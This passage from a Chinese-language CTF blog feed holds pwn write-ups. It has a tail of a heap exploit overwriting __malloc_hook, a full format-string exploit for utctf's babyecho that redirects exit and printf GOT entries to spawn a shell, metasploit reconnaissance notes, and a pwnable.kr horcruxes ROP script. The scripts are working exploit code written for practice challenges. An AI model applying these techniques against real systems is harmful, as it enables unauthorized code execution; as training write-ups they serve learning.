class="string">'./libc.so'</span>)[<span class="number">2</span>]+libc_base</span><br><span class="line"><span class="comment">#libc.symbols['_IO_2_1_stderr_']</span></span><br><span class="line">gadget_addr=<span class="number">0x10a38c</span>+libc_base</span><br><span class="line"></span><br><span class="line">malloc_addr=libc.symbols[<span class="string">'__malloc_hook'</span>]+libc_base</span><br><span class="line">create_sling(<span class="string">"aaaa"</span>)</span><br><span class="line">create_lucy(<span class="string">"aa"</span>,<span class="string">"aaaaa"</span>)</span><br><span class="line">edit_sling(<span class="string">"80"</span>,p64(malloc_addr))</span><br><span class="line">edit_lucy(<span class="string">"0"</span>,<span class="string">"aaaa"</span>,p64(gadget))</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> one_gadget_addr</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> one_gadget_addr:</span><br><span class="line"><span class="keyword">print</span> hex(i)</span><br><span class="line"><span class="keyword">print</span> hex(gadget)</span><br><span class="line"><span class="keyword">print</span> hex(malloc_addr)</span><br><span class="line"><span class="comment">#=&gt; [324293, 324386, 1090444]</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      自从入门pwn之后，感觉卡住了好久，一直无法进阶，最近参 加 了看雪ctf，深刻认识到自己的菜，复现别人的writeup收益良多
    
    </summary>
    
    
    
      <category term="ctf,pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>&#39;prinf_format_string&#39;</title>
    <link href="http://yoursite.com/2019/03/12/prinf-format-string/"/>
    <id>http://yoursite.com/2019/03/12/prinf-format-string/</id>
    <published>2019-03-12T13:53:15.000Z</published>
    <updated>2019-09-15T07:44:35.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-拖到IDA看反汇编"><a href="#0x0-拖到IDA看反汇编" class="headerlink" title="0x0 拖到IDA看反汇编"></a>0x0 拖到IDA看反汇编</h1><p><img src="/2019/03/12/prinf-format-string/IDA.png" alt=""></p><p>明显的format string 漏洞，但是难点如下</p><ul><li>printf只能调用一次，但是想要 <strong>getshell</strong> 必须多次调用</li><li>leak地址找到对应的libc版本<h1 id="0x1-自制循环"><a href="#0x1-自制循环" class="headerlink" title="0x1 自制循环"></a>0x1 自制循环</h1></li></ul><p>我们发现调用完 <strong>printf()</strong> 函数之后会调用 <strong>exit()</strong> 假如把got表的exit()函数指向main函数内部，就可以自制循环了。还是没有脑洞思路不够开阔</p><p>如果在调用printf()函数之后，没有调用任何函数，覆盖 <strong>.fini</strong> 段的数组来实现再调用</p><h1 id="0x2-找到libc版本"><a href="#0x2-找到libc版本" class="headerlink" title="0x2 找到libc版本"></a>0x2 找到libc版本</h1><h1 id="0x3-exploit"><a href="#0x3-exploit" class="headerlink" title="0x3 exploit"></a>0x3 exploit</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment">#r=remote('stack.overflow.fail',9002)</span></span><br><span class="line">r=remote(<span class="string">'127.0.0.1'</span>,<span class="number">8888</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwnable'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf=elf.got[<span class="string">'printf'</span>]</span><br><span class="line">fgets=elf.got[<span class="string">'fgets'</span>]</span><br><span class="line">exit=elf.got[<span class="string">'exit'</span>]</span><br><span class="line">loop_addr=<span class="number">0x804851B</span></span><br><span class="line">payload=<span class="string">''</span></span><br><span class="line">payload+=<span class="string">'A'</span>*<span class="number">2</span>+p32(exit)+<span class="string">'%'</span>+str(u16(p32(loop_addr<span class="number">-6</span>)[<span class="number">0</span>:<span class="number">2</span>]))+<span class="string">'c%11$hn'</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">payload1=<span class="string">''</span></span><br><span class="line">payload1+=<span class="string">'A'</span>*<span class="number">2</span>+p32(printf)+p32(fgets)+<span class="string">'&lt;%11$s&gt;'</span>+<span class="string">'&lt;&lt;%12$sBBBB'</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">data=r.recvuntil(<span class="string">'BBBB'</span>)</span><br><span class="line">address=re.findall(<span class="string">"&lt;(.*)&gt;"</span>,data)</span><br><span class="line">printf_addr=address[<span class="number">0</span>][<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">address=re.findall(<span class="string">"&lt;&lt;(.*)BBBB"</span>,data)</span><br><span class="line">fgets_addr=address[<span class="number">0</span>][<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"><span class="keyword">return</span> u32(printf_addr)</span><br><span class="line">printf_addr=leak()</span><br><span class="line">printf_offset=<span class="number">0x49020</span></span><br><span class="line">system_offset=<span class="number">0x3a940</span></span><br><span class="line">write_addr=printf_addr-printf_offset+system_offset</span><br><span class="line">payload3=<span class="string">''</span></span><br><span class="line">payload3+=<span class="string">'A'</span>*<span class="number">2</span>+p32(printf)+p32(printf+<span class="number">2</span>)+<span class="string">'%'</span>+str(u16(p32(write_addr)[<span class="number">0</span>:<span class="number">2</span>])<span class="number">-10</span>)+<span class="string">'x%11$hn'</span>+<span class="string">'%'</span>+str(u16(p32(write_addr)[<span class="number">2</span>:])-u16(p32(write_addr)[<span class="number">0</span>:<span class="number">2</span>]))+<span class="string">'x%12$hn'</span></span><br><span class="line"><span class="keyword">print</span> payload3</span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x3-遗留问题"><a href="#0x3-遗留问题" class="headerlink" title="0x3 遗留问题"></a>0x3 遗留问题</h1><ul><li>在自制循环时</li></ul><p>有效payload：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">''</span></span><br><span class="line">payload+=<span class="string">'A'</span>*<span class="number">2</span>+p32(exit)+<span class="string">'%'</span>+str(u16(p32(loop_addr<span class="number">-6</span>)[<span class="number">0</span>:<span class="number">2</span>]))+<span class="string">'c%11$hn'</span></span><br></pre></td></tr></table></figure></p><p>无效payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">''</span></span><br><span class="line">payload+=<span class="string">'A'</span>*<span class="number">2</span>+p32(exit)+<span class="string">'%'</span>+str(u16(p32(loop_addr<span class="number">-6</span>)[<span class="number">0</span>:<span class="number">2</span>]))+<span class="string">'c%11$hn'</span>+<span class="string">'&lt;%11$s&gt;'</span></span><br></pre></td></tr></table></figure><p>不知为何</p>]]></content>
    
    <summary type="html">
    
      这里总结一下utctf的babyecho的做法
    
    </summary>
    
    
    
      <category term="ctf,pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>&#39;metasploit学习&#39;</title>
    <link href="http://yoursite.com/2019/03/06/metasploit%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2019/03/06/metasploit学习/</id>
    <published>2019-03-06T12:01:32.000Z</published>
    <updated>2019-09-15T07:44:35.218Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0前言"><a href="#0x0前言" class="headerlink" title="0x0前言"></a>0x0前言</h1><p>最近在《metasploit渗透测试魔鬼训练营》，这是一本实践性非常强的一本书。在这本书中受益良多，在此做总结。</p><h1 id="0x1-kali历史"><a href="#0x1-kali历史" class="headerlink" title="0x1 kali历史"></a>0x1 kali历史</h1><p>再找渗透虚拟机BT5的时候发现没有，原来BT5之后的版本更名为大名鼎鼎的kali，用kali用了一年多了，竟然不知道。。。</p><h1 id="0x2-metasploit安装"><a href="#0x2-metasploit安装" class="headerlink" title="0x2 metasploit安装"></a>0x2 metasploit安装</h1><p>linux下很快就安装完了，倒是windows下非常难安装，没有解决，碰到莫名奇妙的错误，所以，放弃了windows下环境的安装</p><h1 id="0x3-msfconsole使用"><a href="#0x3-msfconsole使用" class="headerlink" title="0x3 msfconsole使用"></a>0x3 msfconsole使用</h1><h2 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h2><p>用法:</p><blockquote><p>whois example.com</p></blockquote><h1 id="0x4-其他工具使用"><a href="#0x4-其他工具使用" class="headerlink" title="0x4 其他工具使用"></a>0x4 其他工具使用</h1><h2 id="0x0域名查询"><a href="#0x0域名查询" class="headerlink" title="0x0域名查询"></a>0x0域名查询</h2><h3 id="0x0-nslookup"><a href="#0x0-nslookup" class="headerlink" title="0x0 nslookup"></a>0x0 nslookup</h3><p>用法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nslookup</span><br><span class="line">&gt; set type=A   </span><br><span class="line">&gt; testfire.net</span><br><span class="line">Server:10.10.10.2</span><br><span class="line">Address:10.10.10.2#53</span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:testfire.net</span><br><span class="line">Address: 65.61.137.117</span><br><span class="line">&gt; exit</span><br></pre></td></tr></table></figure></p><blockquote><p>type为域名解析类型</p></blockquote><h3 id="0x1-dig"><a href="#0x1-dig" class="headerlink" title="0x1 dig"></a>0x1 dig</h3><p>用法</p><blockquote><p>dig @&lt;DNS服务器&gt; &lt;待查询的域名&gt;</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# dig @ns.watson.ibm.com testfire.net</span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.4-2-Debian &lt;&lt;&gt;&gt; @ns.watson.ibm.com testfire.net</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: REFUSED, id: 27163</span><br><span class="line">;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line">;; WARNING: recursion requested but not available</span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;testfire.net.INA</span><br><span class="line">;; Query time: 281 msec</span><br><span class="line">;; SERVER: 129.34.20.80#53(129.34.20.80)</span><br><span class="line">;; WHEN: 三 3月 06 20:29:02 CST 2019</span><br><span class="line">;; MSG SIZE  rcvd: 41</span><br></pre></td></tr></table></figure><h2 id="0x1-IP地址查询"><a href="#0x1-IP地址查询" class="headerlink" title="0x1 IP地址查询"></a>0x1 IP地址查询</h2><h3 id="0x0-http-www-maxmind-com"><a href="#0x0-http-www-maxmind-com" class="headerlink" title="0x0 http://www.maxmind..com"></a>0x0 <a href="http://www.maxmind..com" target="_blank" rel="noopener">http://www.maxmind..com</a></h3><h3 id="0x1-https-searchdns-netcraft-com"><a href="#0x1-https-searchdns-netcraft-com" class="headerlink" title="0x1 https://searchdns.netcraft.com"></a>0x1 <a href="https://searchdns.netcraft.com" target="_blank" rel="noopener">https://searchdns.netcraft.com</a></h3><h3 id="0x2-https-toolbar-netcraft-com-site-report-url-netcraft-net"><a href="#0x2-https-toolbar-netcraft-com-site-report-url-netcraft-net" class="headerlink" title="0x2 https://toolbar.netcraft.com/site_report?url=netcraft.net"></a>0x2 <a href="https://toolbar.netcraft.com/site_report?url=netcraft.net" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report?url=netcraft.net</a></h3><h2 id="0x2-IP地址反查询"><a href="#0x2-IP地址反查询" class="headerlink" title="0x2 IP地址反查询"></a>0x2 IP地址反查询</h2><h3 id="0x0-https-www-ip-adress-com"><a href="#0x0-https-www-ip-adress-com" class="headerlink" title="0x0 https://www.ip-adress.com/"></a>0x0 <a href="https://www.ip-adress.com/" target="_blank" rel="noopener">https://www.ip-adress.com/</a></h3><h2 id="0x2-通过搜索引擎搜索"><a href="#0x2-通过搜索引擎搜索" class="headerlink" title="0x2 通过搜索引擎搜索"></a>0x2 通过搜索引擎搜索</h2><h3 id="0x0-Google-Hacking-技术"><a href="#0x0-Google-Hacking-技术" class="headerlink" title="0x0 Google Hacking 技术"></a>0x0 Google Hacking 技术</h3><p>《Google Hacking for Penetration Testers》</p><h3 id="0x1-SiteDigger和Search-Diggity"><a href="#0x1-SiteDigger和Search-Diggity" class="headerlink" title="0x1 SiteDigger和Search Diggity"></a>0x1 SiteDigger和Search Diggity</h3><h4 id="0x0-下载"><a href="#0x0-下载" class="headerlink" title="0x0 下载"></a>0x0 下载</h4><p><a href="http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx</a></p>]]></content>
    
    <summary type="html">
    
      这里总结一下metasploit工具用法
    
    </summary>
    
    
    
      <category term="metasploit" scheme="http://yoursite.com/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>&#39;pwnable.kr&#39;</title>
    <link href="http://yoursite.com/2019/02/08/pwnable-kr/"/>
    <id>http://yoursite.com/2019/02/08/pwnable-kr/</id>
    <published>2019-02-08T11:21:27.000Z</published>
    <updated>2019-09-15T07:44:35.221Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-fd"><a href="#0x0-fd" class="headerlink" title="0x0 fd"></a>0x0 fd</h1><p>题目很简单，不多说，主要学到了main的三个参数的意义，以及如何传参数</p><p><a href="https://blog.csdn.net/abc_xixi111/article/details/79993899" target="_blank" rel="noopener">参考这篇博客</a></p><h1 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h1><p>这个题目，学到了\x00截断。。。</p><h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><h1 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h1><h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><h1 id="input"><a href="#input" class="headerlink" title="input"></a>input</h1><p>这道题目有5个Stage</p><h2 id="Stage1"><a href="#Stage1" class="headerlink" title="Stage1"></a>Stage1</h2><h2 id="Stage2"><a href="#Stage2" class="headerlink" title="Stage2"></a>Stage2</h2><p>这个Stage主要学到read函数的fd指针，默认的标准输入是 0，标准输出是1，标准出错是2</p><h2 id="Stage3"><a href="#Stage3" class="headerlink" title="Stage3"></a>Stage3</h2><h2 id="Stage4"><a href="#Stage4" class="headerlink" title="Stage4"></a>Stage4</h2><h2 id="Stage5"><a href="#Stage5" class="headerlink" title="Stage5"></a>Stage5</h2><h1 id="horcruxes"><a href="#horcruxes" class="headerlink" title="horcruxes"></a>horcruxes</h1><p>过了许久重拾起博客，坚持每天一道pwn题目，今天做这一道题目，主要是复习 <strong>python ssh()函数的用法</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">con=ssh(host=<span class="string">'host'</span>,user=<span class="string">'user'</span>,password=<span class="string">'password'</span>,port=<span class="number">0</span>)</span><br><span class="line">r=con.connect_remote(<span class="string">'host'</span>,<span class="number">0</span>) <span class="comment">#通过ssh连接运行在服务器本地端口的程序</span></span><br><span class="line">p=con.progress(<span class="string">'./program'</span>)   <span class="comment">#运行本地程序</span></span><br></pre></td></tr></table></figure><p>以及 <strong>python正则</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.findall(<span class="string">r"-?[\d]+"</span>,string) <span class="comment">#完美匹配数字</span></span><br></pre></td></tr></table></figure><p>最后在运行的时候，发现不成功，找找网上的wp,复制exploit运行，发现也不能成功，然而多运行几次就成功了，吐血，难道这个也有概率之说。。。。</p><p>附上自己的exploit<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">con=ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'horcruxes'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>)</span><br><span class="line">r=con.connect_remote(<span class="string">'localhost'</span>,<span class="number">9032</span>)</span><br><span class="line">a_addr=<span class="number">0x809FE4B</span></span><br><span class="line">b_addr=<span class="number">0x809FE6A</span></span><br><span class="line">c_addr=<span class="number">0x809FE89</span></span><br><span class="line">d_addr=<span class="number">0x809FEA8</span></span><br><span class="line">e_addr=<span class="number">0x809FEC7</span></span><br><span class="line">f_addr=<span class="number">0x809FEE6</span></span><br><span class="line">g_addr=<span class="number">0x809FF05</span></span><br><span class="line">get_addr=<span class="number">0x809FFFC</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sum</span><span class="params">()</span>:</span></span><br><span class="line">sum=<span class="number">0</span></span><br><span class="line">string=r.recv()</span><br><span class="line"><span class="keyword">print</span> string</span><br><span class="line">num=re.findall(<span class="string">r"-?[\d]+"</span>,string)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">sum+=int(i)</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line"><span class="keyword">return</span> sum</span><br><span class="line">payload=<span class="string">''</span></span><br><span class="line">payload+=<span class="string">'A'</span>*<span class="number">120</span>+p32(a_addr)</span><br><span class="line">payload+=p32(b_addr)</span><br><span class="line">payload+=p32(c_addr)</span><br><span class="line">payload+=p32(d_addr)</span><br><span class="line">payload+=p32(e_addr)</span><br><span class="line">payload+=p32(f_addr)</span><br><span class="line">payload+=p32(g_addr)</span><br><span class="line">payload+=p32(get_addr)</span><br><span class="line">r.recvuntil(<span class="string">'Select Menu:'</span>)</span><br><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'How many EXP did you earned? : '</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">string=get_sum()</span><br><span class="line"><span class="keyword">print</span> string</span><br><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'How many EXP did you earned? : '</span>)</span><br><span class="line">r.sendline(str(string))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><h1 id="otp"><a href="#otp" class="headerlink" title="otp"></a>otp</h1><p>参考这篇博客：</p><p>(<a href="https://r00tnb.github.io/2018/02/26/pwnable.kr-otp/)[https://r00tnb.github.io/2018/02/26/pwnable.kr-otp/]" target="_blank" rel="noopener">https://r00tnb.github.io/2018/02/26/pwnable.kr-otp/)[https://r00tnb.github.io/2018/02/26/pwnable.kr-otp/]</a></p><p><strong>ulimit</strong> 命令学到了，详情 <strong>man</strong></p>]]></content>
    
    <summary type="html">
    
      闲来无事刷一下pwnable.kr的题目，总结一下所学到的知识
    
    </summary>
    
    
    
      <category term="ctf,pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
</feed>
